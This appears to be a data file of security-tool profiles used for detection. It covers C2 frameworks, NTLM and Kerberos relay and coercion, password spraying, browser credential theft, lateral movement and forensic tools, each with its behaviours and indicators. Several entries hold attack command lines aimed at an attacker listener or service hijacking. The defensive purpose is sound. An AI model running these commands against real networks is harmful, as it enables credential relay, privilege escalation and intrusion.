description: Go-based C2 framework with web UI supporting multiple agent types. Agents compiled for Windows, Linux, and macOS. Supports TCP, HTTPS, DNS, DoH, and QUIC communication channels. Web interface on port 8443. Uses Golang compilation for cross-platform agent generation. Includes built-in pivoting and credential gathering modules. Named after the Greek god of terror.
native_purpose: Open-source Go-based command and control framework for authorized penetration testing and red team operations
known_behaviors: Generates cross-platform Go agents for Windows, Linux, and macOS targets
Supports TCP, HTTPS, DNS, DoH (DNS-over-HTTPS), and QUIC C2 channels
Web-based management interface for operator interaction and session management
Built-in modules for pivoting through compromised networks
Agents use Go compilation resulting in large binaries with Go runtime signatures
indicators: Process: large Go binary (8-15MB) on target system; Go runtime metadata if not stripped
Network: HTTPS on port 443, web UI on port 8443; QUIC/UDP traffic
Network: DNS C2 with encoded subdomains; DoH queries to public resolvers
File: DeimosC2 server files and compiled agent binaries in output/ directory
Memory: Go runtime goroutine structures identifiable in memory forensics
Network: TLS certificates auto-generated with distinctive patterns
JA3: Go HTTP client TLS fingerprint distinguishable from standard browsers
Detection: monitor for large unsigned Go binaries executing with network activity

description: Modular C2 framework with web UI built on Node.js/MongoDB backend. Uses REST API architecture. Supports multiple implant types and communication channels through modular handler system. Default web UI on port 3030. MongoDB stores all operation data. Designed around API-first architecture allowing custom client development. Supports file operations and command execution.

known_behaviors: Node.js/Express backend with MongoDB for operation data storage
REST API-first design allows custom operator clients and automation
Modular handler system supports multiple implant and transport types
Web-based UI for session management and task execution
Supports multiple simultaneous listeners and implant types

Network: implant communications vary by handler module; HTTP/HTTPS common
Database: MongoDB collections for sessions, commands, listeners, implants

description: C2 framework that communicates through legitimate websites by embedding commands in browsable web pages. Client browses a legitimate-looking website hosted by the attacker, and commands are hidden within the HTML source code. Designed to evade network inspection by making C2 traffic appear as normal web browsing. Uses Base64-encoded commands embedded in HTML comments or hidden elements.
native_purpose: Legitimate website-fronted C2 tool for testing network monitoring evasion during authorized security assessments
known_behaviors: Hosts legitimate-looking website that embeds C2 commands in HTML source
Client-side agent browses the website and extracts hidden commands from page source
Commands encoded in Base64 and embedded in HTML comments, hidden divs, or meta tags
Appears as normal HTTPS web browsing to network monitoring tools
Simple architecture: Python server hosting cloned/generated web pages with embedded instructions
indicators: Network: regular HTTP/HTTPS requests to a single website at fixed intervals from client
Web: HTML source contains Base64-encoded strings in comments or hidden elements
Network: POST requests sending command output back to the server in encoded form
Process: Python process hosting web server (trevorc2_server.py)
File: trevorc2_server.py, trevorc2_client.py or compiled client binary
Network: periodic GET requests followed by POST requests in predictable pattern
Detection: inspect HTML source of frequently visited internal sites for encoded data in comments
Network: single client making unusually regular requests to same URL path

description: C2 framework built on .NET Core with modular agent and transport architecture. Uses RabbitMQ for internal message passing. REST API for operator interaction. Supports custom agent and transport module development. Web-based console. PostgreSQL database backend. Docker-based deployment. Designed for extensibility with plugin-based architecture for agents and communication channels.

Modular agent system allowing custom agent development in multiple languages
Transport modules are independently deployable for flexible C2 channel configuration
REST API enables automation and custom operator tool development

description: Python-based C2 framework with web-based management interface. Lightweight design with agents written in Python. Supports basic post-exploitation functionality including file upload/download, shell execution, and screenshot capture. Flask-based web server for operator interaction. Simple HTTP-based C2 protocol with JSON payloads. Low sophistication but effective for basic operations.

description: Impacket NTLM relay tool that intercepts NTLM authentication and relays it to target services. Supports relaying to SMB, LDAP, LDAPS, MSSQL, HTTP, and IMAP. Can perform credential dumping, RBCD abuse, and Active Directory ACL modification via relayed authentication.

known_behaviors: Starts rogue SMB/HTTP/WCF server to capture incoming NTLM authentication
Relays captured NTLM authentication to target services (SMB, LDAP, MSSQL)
Performs credential dumping (SAM, LSA) on relayed SMB connections
Modifies Active Directory ACLs or adds computer objects via relayed LDAP auth
Configures Resource-Based Constrained Delegation (RBCD) via LDAP relay
indicators: Rogue SMB server (TCP 445) or HTTP server (TCP 80) on non-standard host
NTLM authentication relayed within milliseconds to different target than origin
SMB connections without signing from hosts that should enforce signing
LDAP modifications (adding computer objects, modifying msDS-AllowedToActOnBehalfOfOtherIdentity) following NTLM auth
Windows Event ID 4624 showing network logon from IP that did not initiate the connection
SOCKS proxy connections following successful NTLM relay
Active Directory object creation or ACL changes from unexpected accounts
Timing analysis: authentication at server A, immediate action at server B from relay host
Event ID 5136 for Active Directory object modifications after relay

description: NTLM coercion tool that abuses the Encrypting File System Remote Protocol (MS-EFSRPC) to force Windows hosts to authenticate to an attacker-controlled server. Triggers NTLM authentication from domain controllers for relay attacks.
native_purpose: Security testing tool for identifying MS-EFSRPC coercion vulnerabilities and testing NTLM relay protections on domain controllers.
known_behaviors: Calls EfsRpcOpenFileRaw and other MS-EFSRPC functions to trigger outbound NTLM auth
Forces target machine account to authenticate to attacker-specified listener
Targets domain controllers to obtain their machine account NTLM authentication
Works unauthenticated on unpatched systems via MS-EFSRPC named pipe
Used in combination with ntlmrelayx for AD CS (ADCS) relay attacks
command_examples: python3 PetitPotam.py -u user -p pass -d domain listener_ip target_dc
indicators: RPC connections to \\pipe\efsrpc, \\pipe\lsarpc, \\pipe\samr, \\pipe\lsass named pipes
MS-EFSRPC function calls (EfsRpcOpenFileRaw) from non-standard clients
Domain controller initiating outbound NTLM authentication to non-DC hosts
Windows Event ID 4624 showing DC machine account authenticating to workstation
Network traffic on TCP 445 with EFSRPC operations followed by outbound SMB from DC
Unauthenticated RPC binds to EFSRPC interface UUID (c681d488-d850-11d0-8c52-00c04fd90f7e)
Correlation: coercion trigger followed by NTLM relay to AD CS or LDAP

description: Abuses the Print Spooler service (MS-RPRN) to force Windows hosts to authenticate to an attacker-controlled server. Leverages RpcRemoteFindFirstPrinterChangeNotificationEx to trigger outbound NTLM authentication from the target.
native_purpose: Security testing tool for demonstrating the 'Printer Bug' coercion vulnerability in Windows Print Spooler service and testing NTLM relay defenses.
known_behaviors: Calls RpcRemoteFindFirstPrinterChangeNotificationEx via MS-RPRN
Forces target machine to authenticate back to attacker-specified host
Targets domain controllers and servers with Print Spooler running
Requires valid domain credentials to trigger the coercion
Used in unconstrained delegation attacks to capture TGTs
indicators: RPC connection to \\pipe\spoolss named pipe from non-print-server hosts
Print Spooler service (spoolsv.exe) initiating outbound SMB connections
Domain controller making NTLM auth to workstation (abnormal auth direction)
Windows Event ID 4624 from DC machine account to non-DC target
MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx calls from unusual sources
Spooler service starting outbound connections immediately after inbound RPC
Network flow: inbound RPC to spoolss pipe followed by outbound SMB within seconds

description: Comprehensive NTLM authentication coercion tool that consolidates all known Windows coercion methods (MS-EFSRPC, MS-RPRN, MS-DFSNM, MS-FSRVP, and more) into a single framework. Scans for and exploits coercible RPC functions.
native_purpose: Security assessment tool for comprehensively testing all known NTLM coercion attack vectors against Windows hosts and validating coercion mitigations.
known_behaviors: Scans targets for all known coercible RPC interfaces and functions
Triggers NTLM authentication via multiple protocols (EFSRPC, RPRN, DFSNM, FSRVP)
Tests both authenticated and unauthenticated coercion methods
Supports scanning mode to identify vulnerable services without exploitation
Forces target machine accounts to authenticate to attacker-controlled listener
command_examples: coercer scan -t dc01.corp.local -u user -p pass -d corp.local
coercer coerce -l attacker_ip -t dc01 -u user -p pass -d corp.local
coercer coerce -l attacker_ip -t dc01 -u user -p pass --filter-protocol-name MS-EFSRPC
indicators: Sequential RPC connections to multiple named pipes (efsrpc, spoolss, dfsnm, netdfs) from single host
Multiple coercion-related RPC function calls in rapid succession
Target machine initiating outbound NTLM authentication after receiving RPC calls
Scanning pattern: same source testing multiple RPC interfaces across hosts
Named pipe connections to \\pipe\efsrpc, \\pipe\spoolss, \\pipe\netdfs from non-standard sources
Python process making RPC calls to multiple coercion endpoints
Outbound authentication from servers to workstations following inbound RPC

description: Kerberos relay tool that relays Kerberos AP-REQ authentication to other services on the same or different hosts. Enables local privilege escalation by relaying Kerberos authentication to LDAP for RBCD configuration or to SMB for local access.
native_purpose: Security research tool demonstrating Kerberos relay attack paths for local privilege escalation and testing Kerberos protection mechanisms.
known_behaviors: Triggers local Kerberos authentication via COM object activation (DCOM)
Relays Kerberos AP-REQ tickets to LDAP for Active Directory modifications
Configures Resource-Based Constrained Delegation (RBCD) via relayed Kerberos auth
Relays to ADCS for certificate enrollment using machine account context
Creates new computer objects or modifies existing AD objects via relay
indicators: COM/DCOM object activation (CLSID instantiation) followed by Kerberos AP-REQ
Kerberos authentication to LDAP from local system context for AD modifications
msDS-AllowedToActOnBehalfOfOtherIdentity attribute modified on computer objects
Event ID 5136 showing RBCD delegation configuration changes
Unusual DCOM activation events (Event ID 10036) with specific CLSIDs
Local system making LDAP modifications to Active Directory
New computer object creation in AD from unexpected source
Kerberos ticket requests followed by relay to different service within milliseconds

description: Universal local privilege escalation tool that automates the KrbRelay RBCD attack chain. Combines Kerberos relay with RBCD configuration and S4U2Self/S4U2Proxy to escalate from standard user to SYSTEM on domain-joined Windows hosts.
native_purpose: Security testing tool for demonstrating that domain-joined workstations are vulnerable to Kerberos relay-based local privilege escalation when LDAP signing is not enforced.
known_behaviors: Creates a new machine account in Active Directory (if MAQ > 0)
Triggers local Kerberos authentication via DCOM/COM activation
Relays Kerberos auth to LDAP to configure RBCD on the local machine object
Performs S4U2Self and S4U2Proxy to obtain service ticket as privileged user
Uses obtained ticket for local SCM access to execute as SYSTEM
indicators: New computer account created in AD from workstation (not DC/admin action)
RBCD configuration (msDS-AllowedToActOnBehalfOfOtherIdentity) set on local machine account
S4U2Self/S4U2Proxy Kerberos requests from newly created machine account
DCOM activation (Event ID 10036) followed by LDAP operations
Service creation or SCM access using Kerberos service ticket
Event ID 4741 (computer account created) from non-administrative context
Event ID 5136 showing RBCD attribute modification on local machine
Local privilege escalation pattern: standard user to SYSTEM via Kerberos

description: NTLM coercion tool abusing the Distributed File System (MS-DFSNM) protocol to force Windows domain controllers to authenticate to attacker-controlled servers. Exploits NetrDfsRemoveStdRoot and NetrDfsAddStdRoot RPC calls.
native_purpose: Security research tool for testing MS-DFSNM coercion vulnerability and validating NTLM relay mitigations on domain controllers.
known_behaviors: Calls MS-DFSNM RPC functions to trigger outbound NTLM authentication
Forces domain controller machine account to authenticate to attacker listener
Uses NetrDfsRemoveStdRoot or NetrDfsAddStdRoot API calls for coercion
Connects to \\pipe\netdfs named pipe on target for RPC operations
Designed to chain with ntlmrelayx for ADCS or LDAP relay attacks
command_examples: python3 DFSCoerce.py -u user -p pass -d corp.local listener_ip dc01
python3 DFSCoerce.py -u user -hashes :nthash -d corp.local listener_ip dc01
indicators: RPC connection to \\pipe\netdfs named pipe from non-DFS management hosts
MS-DFSNM NetrDfsRemoveStdRoot or NetrDfsAddStdRoot RPC calls from unusual sources
Domain controller initiating outbound NTLM authentication after DFS RPC call
Network flow: inbound RPC to netdfs pipe followed by outbound SMB/NTLM from DC
Python process connecting to target port 445 and initiating DFS-related RPC
Event ID 4624 showing DC machine account authenticating to workstation IP
Sequential coercion attempts using DFS namespace operations

description: Lightweight password spraying tool for Active Directory environments. Tests a single password against multiple accounts via SMB, OWA, Lync, or LDAP authentication endpoints with configurable delays to avoid lockout.
native_purpose: Password policy auditing tool for testing password strength across Active Directory accounts while respecting lockout thresholds.
known_behaviors: Tests one password against many domain user accounts (spray pattern)
Supports multiple authentication protocols (SMB, LDAP, OWA, Lync/Skype)
Implements configurable delay between attempts to avoid account lockout
Reads user lists from file and reports successful authentications
Can target Exchange OWA endpoints for cloud-adjacent password testing
indicators: Single password tested against many accounts in timed intervals
Windows Event ID 4625 with identical bad password across many accounts
Event ID 4771 (Kerberos pre-auth failure) from single source for many principals
OWA/Autodiscover login attempts from single IP for many accounts
Authentication attempts spaced at regular intervals (spray delay pattern)
Bash/shell process reading user list files and performing sequential auth attempts
LDAP bind attempts with different usernames from single source

description: Extracts credentials, cookies, and history from Firefox and Thunderbird profiles. Decrypts stored passwords by accessing key4.db (NSS key database) and logins.json without requiring the master password if none is set.
native_purpose: Security audit tool for demonstrating insecure credential storage in Mozilla products and testing browser credential theft detection.
known_behaviors: Accesses Firefox and Thunderbird profile directories for credential extraction
Decrypts logins.json using key material from key4.db NSS database
Extracts and decrypts saved passwords without requiring master password
Reads cookie databases (cookies.sqlite) for session hijacking data
Exports browsing history and bookmarks for intelligence gathering
indicators: Access to %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json
Access to %APPDATA%\Mozilla\Firefox\Profiles\*.default\key4.db
Access to %APPDATA%\Thunderbird\Profiles\*.default\logins.json
Reading cookies.sqlite from Firefox profile directories
NSS library (nss3.dll) loading by non-Firefox/Thunderbird process
PK11SDR_Decrypt API calls from processes other than Firefox
Bulk file reads across Mozilla profile directories
Process accessing both key4.db and logins.json in same execution context
cert9.db and key4.db file access from non-browser process

description: Endpoint visibility and digital forensics platform that enables rapid artifact collection, threat hunting, and monitoring across large-scale enterprise environments using VQL (Velociraptor Query Language)
native_purpose: Endpoint monitoring, artifact collection, and incident response at scale. Deploys agents to endpoints for real-time forensic data collection, file acquisition, process monitoring, and hunt-based threat detection across thousands of machines simultaneously
known_behaviors: Deploys lightweight agents to endpoints that maintain persistent gRPC connections to the server for command-and-control of forensic operations
Executes VQL queries across endpoints to collect artifacts including prefetch files, event logs, registry hives, and memory dumps
Performs server-side and client-side hunt operations that fan out queries to all enrolled clients simultaneously
Monitors real-time file system changes, process executions, and network connections via client event monitoring
Collects and parses forensic artifacts from Windows (MFT, USN Journal, NTFS metadata), Linux (wtmp, btmp, auth logs), and macOS (unified logs, FSEvents)

Network: persistent gRPC connections on port 8000 (frontend) and 8889 (GUI)

Artifact collection paths: C:\Windows\System32\winevt\Logs\*, C:\$MFT, C:\$Extend\$UsnJrnl:$J
Hunt flow metadata stored in server datastore with timestamps, client IDs, and query results

description: Kroll Artifact Parser and Extractor - triage collection and processing tool that rapidly acquires forensic artifacts from live systems and disk images using predefined target and module definitions
native_purpose: Rapid forensic triage collection of artifacts from Windows systems. Collects files, registry hives, event logs, browser data, and other forensic artifacts using community-maintained target definitions, then processes them through analysis modules for timeline creation and artifact parsing
known_behaviors: Collects forensic artifacts from live systems or mounted images based on YAML target definitions specifying file paths, masks, and recursive collection rules
Processes collected artifacts through module definitions that invoke external tools like Eric Zimmerman's utilities, RegRipper, and log parsers
Creates structured output directories with collected files preserving original directory hierarchy and timestamps
Supports compound targets that chain multiple collection targets together for comprehensive triage packages
Generates CSV and JSON output from parsed artifacts including timeline data, registry analysis, and browser history

File access patterns targeting: C:\Windows\System32\config\SAM, SYSTEM, SOFTWARE, SECURITY, DEFAULT
Collection of C:\Windows\System32\winevt\Logs\*.evtx files

description: Advanced memory forensics framework that extracts digital artifacts from volatile memory (RAM) dumps, enabling analysis of running processes, network connections, loaded modules, and injected code from physical memory images
native_purpose: Memory forensics analysis of RAM captures from Windows, Linux, and macOS systems. Identifies running and hidden processes, extracts credentials, detects code injection, maps network connections, recovers command history, and identifies rootkit behavior by analyzing kernel data structures in memory dumps
known_behaviors: Analyzes physical memory dumps to reconstruct process lists, DLL mappings, handle tables, and thread information from kernel data structures
Detects process injection techniques including DLL injection, process hollowing, and reflective loading by comparing VAD entries to PEB module lists
Extracts network connection artifacts including TCP/UDP endpoints, listening ports, and connection states from memory
Recovers registry hives, command line history, clipboard contents, and environment variables from process memory spaces
Identifies rootkit behavior by cross-referencing multiple kernel object lists (EPROCESS, PspCidTable, CSRSS handle table) to find hidden processes
indicators: Process: python3 or vol.py executing with -f flag pointing to .dmp, .raw, .vmem, or .mem files
Memory image files typically large (GB-scale): *.dmp, *.raw, *.vmem, *.lime, *.mem
Analysis plugins invoked: pslist, pstree, netscan, malfind, dlllist, handles, cmdline, filescan
Output showing reconstructed process trees with PIDs, PPIDs, creation times, and exit times
Malfind results showing MZ headers or shellcode in unexpected memory regions with PAGE_EXECUTE_READWRITE protection
Symbol table files (ISF) downloaded or cached in volatility3/symbols/ directory
Timeliner plugin output creating forensic timelines from memory artifacts
YARA rule scanning across process memory spaces via yarascan plugin

description: Open-source digital forensics platform providing GUI-based disk image analysis, file recovery, timeline analysis, keyword searching, and artifact extraction for law enforcement and incident response investigations
native_purpose: Full disk forensic analysis of hard drive images, removable media, and local disks. Provides file system analysis, deleted file recovery, email parsing, web artifact extraction, registry analysis, multimedia analysis, and keyword searching with a case management framework for multi-examiner investigations
known_behaviors: Ingests disk images (E01, raw/dd, VMDK, VHD) and performs automated ingest modules including hash lookup, keyword search, email parsing, and web artifact extraction
Recovers deleted files by analyzing unallocated space, orphan files, and file system journal entries across NTFS, FAT, EXT, HFS+ file systems
Creates super timelines aggregating file system timestamps (MACB), event logs, browser history, and communication artifacts into unified chronological views
Performs hash-based analysis using NSRL, HashKeeper, and custom hash sets to identify known good/bad files
Generates reports in HTML, Excel, and other formats with tagged artifacts, bookmarks, and examiner notes for case documentation

indicators: Process: autopsy.exe or autopsy64.exe running with Java runtime
Case database files: autopsy.db (SQLite) in case output directory
Solr index directory for keyword search indexing of case data

File carving operations on unallocated space producing recovered files
Hash database lookups against NSRL (nsrl-*.idx) and custom hash sets
Central Repository database (cr.db) for cross-case correlation

description: Super timeline creation engine that extracts timestamps from a wide variety of file formats, log files, and forensic artifacts to produce a unified chronological timeline of system activity for forensic analysis
native_purpose: Automated forensic timeline creation by parsing timestamps from hundreds of artifact types including event logs, registry hives, file systems, browser databases, prefetch files, and application logs into a normalized timeline format for investigation and analysis
known_behaviors: Parses over 300 different artifact formats extracting timestamps and contextual data into a unified Plaso storage file (.plaso)

Parser activity targeting: Windows Event Logs, Prefetch, MFT, Registry, SQLite databases
Output CSV files with columns: date, time, timezone, MACB, source, sourcetype, type, user, host, short, desc

Worker process spawning for parallel artifact parsing across CPU cores

description: Windows event log fast forensics timeline generator and threat hunting tool written in Rust that applies Sigma-based detection rules against EVTX files to identify suspicious activity and create forensic timelines
native_purpose: Rapid analysis of Windows Event Logs (EVTX) for threat hunting and incident response. Applies Sigma detection rules and built-in Hayabusa rules to identify malicious activity patterns, generates forensic timelines, and produces detection summaries with MITRE ATT&CK mapping

Produces HTML summary reports with detection metrics, critical/high/medium/low alert distributions, and top triggered rules

Output files: timeline.csv, timeline.jsonl with columns including Timestamp, RuleTitle, Level, MitreTactics, MitreTags

description: Rapid Windows forensic artifact search and threat hunting tool that applies Sigma rules and custom detection logic against event logs, MFT, and Shimcache to identify malicious activity patterns
native_purpose: Fast forensic analysis of Windows artifacts including EVTX event logs, MFT records, Shimcache, and other evidence sources. Supports Sigma rule application, keyword searching, and custom detection logic for rapid triage during incident response

description: PowerShell-based threat hunting tool that analyzes Windows Event Logs for indicators of compromise including credential attacks, lateral movement, persistence mechanisms, and command obfuscation patterns
native_purpose: Automated analysis of Windows Security, System, Sysmon, and PowerShell event logs to detect attack patterns. Identifies brute force attacks, password spraying, suspicious service installations, encoded PowerShell commands, Mimikatz usage, and other common attack techniques
known_behaviors: Parses Windows Security event log (4624, 4625, 4648, 4720, 4732) to detect credential attacks, lateral movement, and account manipulation
Analyzes PowerShell event logs (4103, 4104) for obfuscated commands, encoded payloads, and suspicious cmdlet usage patterns

description: Windows system monitoring service that logs detailed information about process creation, network connections, file changes, registry modifications, WMI activity, and other system events to the Windows Event Log for security monitoring and forensic analysis
native_purpose: Advanced Windows endpoint telemetry collection providing detailed audit logging beyond native Windows capabilities. Records process creation with full command lines and hashes, network connections with DNS queries, file creation timestamps, registry modifications, driver loading, WMI events, named pipe operations, and clipboard access for threat detection and incident response

description: Pattern matching engine for malware identification and classification that uses rule-based descriptions to scan files, memory, and processes for byte patterns, strings, and conditions indicating malicious content
native_purpose: Malware identification and classification through pattern matching rules. Security researchers create YARA rules describing malware families, exploit kits, and threat actor tooling using string patterns, byte sequences, regular expressions, and boolean conditions to scan files, directories, and process memory for matches
known_behaviors: Scans files and directories against YARA rules containing string definitions, byte patterns, regex, and boolean conditions to identify matches
Supports scanning running process memory for indicators of compromise without requiring disk artifacts
Evaluates complex conditions combining string matches, file size, entry point, PE imports, and custom modules (PE, ELF, Math, Hash)
Integrates with forensic tools (Volatility, Velociraptor, KAPE) as a scanning engine for memory and disk analysis
Supports tagged rules with metadata including malware family, author, severity, and MITRE ATT&CK references

YARA rule files (*.yar, *.yara) containing rule definitions with meta, strings, and condition sections

description: Generic signature format for log-based detection rules that provides a vendor-agnostic way to describe suspicious activity patterns, convertible to SIEM-specific query languages (Splunk SPL, Elastic KQL, Microsoft KQL, etc.)
native_purpose: Standardized detection rule format enabling security teams to write vendor-neutral detection logic once and convert to any SIEM platform. Sigma rules describe suspicious log event patterns using YAML syntax with log source definitions, detection conditions, and metadata for sharing detection knowledge across the security community
known_behaviors: Defines detection rules in YAML format specifying log sources, field conditions, aggregations, and boolean logic for identifying suspicious events
Converts rules to SIEM-specific formats using sigma-cli backends: Splunk SPL, Elastic/Lucene, Microsoft Sentinel KQL, QRadar AQL, and more
Maintains a community rule repository with thousands of detection rules mapped to MITRE ATT&CK techniques and severity levels
Supports field modifiers (contains, startswith, endswith, base64, re) for flexible pattern matching in detection conditions
Provides processing pipelines for field name mapping and log source translation between different SIEM platforms
indicators: Rule files: *.yml files with 'title:', 'logsource:', 'detection:', and 'condition:' YAML keys
Process: sigma or sigma-cli executing convert or check subcommands
Logsource categories: process_creation, network_connection, file_event, registry_event, dns_query
Detection field modifiers: |contains, |startswith, |endswith, |base64, |re, |all
Rule severity levels: informational, low, medium, high, critical
MITRE ATT&CK tags: attack.t1059, attack.execution, attack.persistence format
Backend pipeline configuration files for field mapping between log formats

description: Open-source network intrusion detection and prevention system (IDS/IPS) that performs real-time traffic analysis, packet logging, and protocol-based detection using signature rules to identify network attacks and suspicious traffic patterns
native_purpose: Network-based intrusion detection and prevention by analyzing live network traffic or PCAP files against a rule set. Detects network attacks, malware communication, exploit attempts, policy violations, and suspicious traffic patterns using signature-based rules with protocol analysis capabilities

Applies ordered rule sets matching on protocol fields, IP addresses, ports, flow direction, and payload content to trigger alerts

Logs alerts in unified2, JSON, syslog, or pcap format with full packet capture for matched events
Performs protocol decoding and reassembly for HTTP, DNS, FTP, SMTP, TLS, and other protocols to detect application-layer attacks

Rule files: /etc/snort/rules/*.rules containing 'alert tcp', 'alert udp', 'drop' directives

description: Operating system instrumentation framework that exposes OS internals as a relational database queryable with SQL, enabling real-time endpoint visibility into processes, network connections, users, file changes, and system configuration

description: Python implementation of PSExec-style remote command execution over SMB. Creates a service on the remote host via the SVCCTL RPC interface, uploads a binary to the ADMIN$ share, and executes it as SYSTEM. Produces distinctive SMB and service creation artifacts.
native_purpose: Legitimate penetration testing tool for validating remote code execution paths via SMB service creation in Windows environments.

Uploads a randomly named executable to the ADMIN$ or C$ share

Cleans up service and uploaded binary upon session termination

RemComSvc or similar service binary written to disk
SMB write operations to hidden administrative shares
Sysmon Event ID 1 showing services.exe as parent process for cmd.exe or powershell.exe

Redirects command output to a temporary file on a writable SMB share

description: Fileless lateral movement tool that abuses the Windows Service Control Manager (SCM) to change an existing service's binary path to execute a command, then restores the original path. Leaves no binary on disk and reuses legitimate services.

SCShell.py target XblAuthManager 'cmd /c whoami > C:\out.txt' domain/user:pass
indicators: Service configuration change events (Event ID 7040) for legitimate services
Service binPath modification to cmd.exe, powershell.exe, or other executables

description: Classic Windows port forwarding tool used for TCP port redirection. One of the earliest and most widely used pivoting utilities in adversary operations, enabling simple but effective port-to-port forwarding through compromised hosts.
